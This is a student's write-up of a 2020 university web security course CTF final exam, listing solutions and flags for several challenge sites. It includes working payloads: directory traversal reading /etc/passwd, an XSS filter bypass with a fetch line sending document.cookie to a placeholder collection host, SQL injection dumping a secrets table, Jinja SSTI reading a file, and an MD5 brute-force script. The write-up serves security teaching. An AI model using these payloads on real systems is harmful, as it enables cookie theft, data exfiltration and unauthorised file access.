---
title: "Final Exam"
date: 2020-08-21T17:00:15+10:00

description: "A not-so-in-depth writeup of the questions I was able to solve"

categories: ["Course CTF"]
hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

# COMP6443/COMP6843 Finals

_2020 Session Two_

Andrew Wong  
z5206677

---

# Section A

## qasa.-QBSITE-

### QASA - Robots

robots.txt contains a file leak 8fda877f-38c4-4b1f-96b5-2d35f64220ba.php

> COMP6443FINAL{QuokkasAreNotRobots.ejUyMDY2Nzc=.4FbOZsUdzG+o0b6cLVIPIw==}

### QASA - Cookie

Cookie 'Quokie' contains the flag, but reversed

`}==gvzQNAPzzHbgDMQU6n8YDt.=czN2YDMyUje.seikouQruOtpeccAesaelP{LANIF3446PMOC`

> COMP6443FINAL{PleaseAcceptOurQuokies.ejUyMDY2Nzc=.tDY8n6UQMDgbHzzPANQzvg==}

### QASA - Header

HTTP response contains a base64 header

`Rmxhzw: Q09NUDY0NDNGSU5BTHtIZWFkZXJzQXJlQmV0dGVySW42NC5lalV5TURZMk56Yz0ubDZLMndaRm0rbWhSWVFSbU5tVndpdz09fQ==`

```
FlaÏ:COMP6443FINAL{HeadersAreBetterIn64.ejUyMDY2Nzc=.l6K2wZFm+mhRYQRmNmVwiw==}
```

> COMP6443FINAL{HeadersAreBetterIn64.ejUyMDY2Nzc=.l6K2wZFm+mhRYQRmNmVwiw==}

### QASA - IDOR

5.jpg is not shown in the site.  
Link inside `https://qasa.-QBSITE-/img/5.jpg`

> COMP6443FINAL{QuokkasGonnaQuok.ejUyMDY2Nzc=.GU2If54nIeVZo/amlL2NnQ==}

## pds.-QBSITE-

### PDS - Recon

Read the comments

> COMP6443FINAL{THANK_YOU_FOR_READING_THE_COMMENTS.ejUyMDY2Nzc=.nTt7pxvIjPmvvDex+5u61A==}

### PDS - logs.txt

Read robots.txt to find .htaccess and .logs.txt, can be accessed through directory traversal on `file.php`

> COMP6443FINAL{I_AM_AN_ALIGATOR.ejUyMDY2Nzc=.lvncEPp9tD165+eNfzKEFA==}

### PDS - htaccess

Read robots.txt to find .htaccess and .logs.txt, can be accessed through directory traversal on `file.php`

> COMP6443FINAL{HELLO_FROM_ACCESS.ejUyMDY2Nzc=.rMGRqEFh0AobT/r/6uWvyg==}

### PDS - Old PDFs

Directory traverse to the `index.php` location - https://pds.-QBSITE-/file.php?name=../../index.php.  

It reveals a comment

```
<!-- Note when updating new PDSs - move the old PDF to the parent directory -->
```

We can then view any old PDF file (same flag) - https://pds.-QBSITE-/file.php?name=../anz-v1.pdf

> COMP6443FINAL{OH_NO_YOU_FOUND_ME.ejUyMDY2Nzc=.+oeE/HMi7PDhFcptMUCE1g==}

### PDS - File.php

Directory traverse to the `file.php` location - https://pds.-QBSITE-/file.php?name=../../file.php

> COMP6443FINAL{PHP_SAUCE.ejUyMDY2Nzc=.YVhu20e/CTKUHtlxjmQ3Ew==}

### PDS - etc/passwd

Directory traverse to the `/etc/passwd` location - https://pds.-QBSITE-/file.php?name=../../../etc/passwd

> COMP6443FINAL{I_FOUND_YOUR_PASSWD.ejUyMDY2Nzc=.lsThGxXf+mXIMhrHbQofMA==}

<!-- ### ???

TODO: MISSING ONE -->

## products.-QBSITE-

Inject the following CSP headers

```
connect-src *;
script-src-elem *;
```

Then inject the js payload into the search
```
<scrscriptipt src="your_javascript_payload"></scrscriptipt>
```

JS payload contains
```
fetch('https://your.collection.site/?x=' + document.cookie)
```

> COMP6443FINAL{ITS_TRIVIAL_IKR.ejUyMDY2Nzc=.POODv7jo5n0ieVmF0tJkXA==}

## logmein.-QBSITE-

### Log Me In

`admin:admin`

> COMP6443FINAL{LOGMEIN1.ejUyMDY2Nzc=.EcB76t4eiSCMAfHaUqr9jg==}

### Log Me In 2

md5 of `797cb93f8b1159e6dc68b2b7fddd6c55` can be looked up online

`flag2:Password01`

> COMP6443FINAL{LOGMEIN2.ejUyMDY2Nzc=.+l8abc0T4M1vbkevpM4lHQ==}

### Log Me In 3

Write a script to bruteforce md5 hashes that start with `c4f48c`

`flag3:30906`

> COMP6443FINAL{LOGMEIN3.ejUyMDY2Nzc=.WV/2Xvsu6FQboXcLFlDSOQ==}

```python3
#!/usr/bin/python3
import hashlib 

with open("rockyou.txt", "rb") as f:
  for line in f.readlines():
    line = line.strip()
    if hashlib.md5(line).hexdigest().startswith("c4f48c"):
        print(line)
        break
```

## poem-portal.-QBSITE-

### Poems Portal - Source code

In source code

> COMP6443FINAL{maythesourcebewithyou.ejUyMDY2Nzc=.c697ehSKNLZO4Dcncz5GsA==}

### Poems Portal - Pastebin1

Googling `mKLMd9mJ` reveals a pastebin paste - https://pastebin.com/mKLMd9mJ

> COMP6443{ff9b110c-4c40-4089-8691-1908ad12cef2}

### Poems Portal - Pastebin2

Googling `mKLMd9mJ` reveals a pastebin paste - https://pastebin.com/mKLMd9mJ

> COMP6443{8fda877f-38c4-4b1f-96b5-2d35f64220ba}

### Poems Portal - Github

robots.txt leaks a link `/admin/`, which contains a HTML comment

```
<!-- You must be used to looking at page source by now!! This is to emphasize that client side validation is BAD. To build this login page, Abhijeth used an opensource project thanks to @mariofont. Looks like Abhijeth found some issues too. Use your recon skills -->
```

We can find that #abijeth has posted an issue - https://github.com/mariofont/PHP-Login/issues/8

It contains a path `0e5f776f-e4d8-45a1-973d-c99f0fcf5c77.php` that we can open - https://poem-portal.-QBSITE-/admin/0e5f776f-e4d8-45a1-973d-c99f0fcf5c77.php

> COMP6443FINAL{YOUR_NEXT_CHALLENGE_IS_TO_LOGIN_AS_ADMIN.ejUyMDY2Nzc=.4LsOkR8ec/DkYgG9ek6NeA==}

### Poems Portal - Admin

```
<!-- If you are reading this comment, then you can directly do an Authbypass as an admin and not steve by reading php documentation. This way you might miss the recon flag-->
```

Inside the https://www.php.net/manual/en/function.password-hash.php, there are some sample passwords, as suggested by Abijeth.

> COMP6443FINAL{Authentication_bypass_using_default_password.ejUyMDY2Nzc=.HVL65LdgtivuQGvDZ/DZTQ==}

# Section B

## qos.-QBSITE-

### QuoccaOS - Homepage - Javascript

Source code contains a flag - https://qos.-QBSITE-/qos.js

> COMP6443FINAL{CLOSED_SOURCE_SOFTWARE_DOES_NOT_EXIST.ejUyMDY2Nzc=.+0WLfVV+Y8VsBHW6M36oow==}

### QuoccaOS - Other - pprof / robots.txt

robots.txt contains a reference to `/debug/pprof/` -> https://qos.-QBSITE-/debug/pprof.  
We can set the debug cookie to `1`.  

> COMP6443FINAL{I_LOVE_LIVE_DEBUGGING.ejUyMDY2Nzc=.Kv6Nr7G2oFjhLyFxCS7SQA==}

### QuoccaOS - Other - lmao lmao lmao lmao lmao / Stack Trace

Some debug links reference some namespace `lmaolmaolmaolmaolmao`.  
i.e. https://qos.-QBSITE-/debug/pprof/goroutine?debug=1

> COMP6443FINAL{STACK_TRACE_IS_MY_FRIEND.ejUyMDY2Nzc=.V8CRX3ctVrf6evJPOPtPtg==}

### QuoccaOS - Other - Secret Admin Portal

robots.txt references a path `/admin/` - https://qos.-QBSITE-/admin

This contains a comment
```
<!-- SREs: configure this password in the new added cli flag -secret_portal_password -->
```

The cmdline debug link contains the command line instruction that run the server - https://qos.-QBSITE-/debug/pprof/cmdline

```
/app/challenges/final/qos/image.binary�-listen�0.0.0.0:80�-jwt_public_key�jwtkeys/jwt.pub�-secret_portal_password�what_could_possibly_go_wrong�-profile_renderer�challenges/final/qos/renderer�-profile_data�/data/profile/�-profile_render_timeout�2s
```

We can use the password `what_could_possibly_go_wrong` for https://qos.-QBSITE-/admin

> COMP6443FINAL{I_ALWAYS_PASS_SECRET_IN_CLI_ARGUMENT.ejUyMDY2Nzc=./4S8OqFPu/usEhCAtmmUyA==}

<!-- 8f60992665ca6329da8bb3422b576de0 -->
 <!-- com.quoccabank.qos.init(); -->

### QuoccaOS - Handbook v1

Trying out payloads we find the following things:

* `/**/` is replaced by `/BADHACKER/`
* ` ` (space) is replaced by `NOSPACE`

We can avoid these replacements by using `/*something*/`, or using `()` in replacement of spaces


* `'OR(1=1)#s`
* `'UNION(SELECT(1),2)#s`
* `'UNION(SELECT('XXX'),'YYY')#`

```js
// Script to replace spaces with /*_*/ 
function t(sql) {
    return sql.replace(/ /g, "/*_*/")
}
```

First we can leak the tables

```
// t(`zzz' UNION SELECT TABLE_NAME,2 FROM INFORMATION_SCHEMA.TABLES #`)
zzz'/*_*/UNION/*_*/SELECT/*_*/TABLE_NAME,2/*_*/FROM/*_*/INFORMATION_SCHEMA.TABLES/*_*/#
```

This reveals the tables `courses`, and `secrets`

Likewise we can leak the column names

```
// t(`zzz' UNION SELECT TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS #`)
zzz'/*_*/UNION/*_*/SELECT/*_*/TABLE_NAME,COLUMN_NAME/*_*/FROM/*_*/INFORMATION_SCHEMA.COLUMNS/*_*/#
```

This reveals the table structures of `courses` and `secrets`

* `courses` - `id`, `title`
* `secrets` - `secret`

Finally we can retrieve the `secret` column


```
// t(`zzz' UNION SELECT secret,2 FROM secrets #`)
zzz'/*_*/UNION/*_*/SELECT/*_*/secret,/*_*/2/*_*/FROM/*_*/secrets/*_*/#
```

> COMP6443FINAL{0a89d110-05bd-4da0-a12d-not-a-fake-but-a-real-flag.ejUyMDY2Nzc=.HY3Bw5luRI3bP2cJn9EiuQ==}


## QuoccaOS - Profile - SSTI config

We can inject the Jinja replacement `{{config}}`

> COMP6443FINAL{I_HEARD_YOU_COMPLAINING_THERE_IS_NO_SSTI_CHALLENGE_DURING_LECTURE_SO_HERE_YOU_GO.ejUyMDY2Nzc=.hUR5gUu5KRQr4Q959sWCUA==}

## QuoccaOS - Profile - SSTI flag.txt

Python classes contain references to their superclasses, which we can exploit with more SSTI

`{{ [].__class__.__base__.__subclasses__()[40]('flag.txt').read() }}`

> COMP6443FINAL{DID_YOU_TRY_RECOMMENDING_YOUR_PROFILE_TO_ADMIN.ejUyMDY2Nzc=.eCZ3/CB3bmez8s/VtABkqw==}

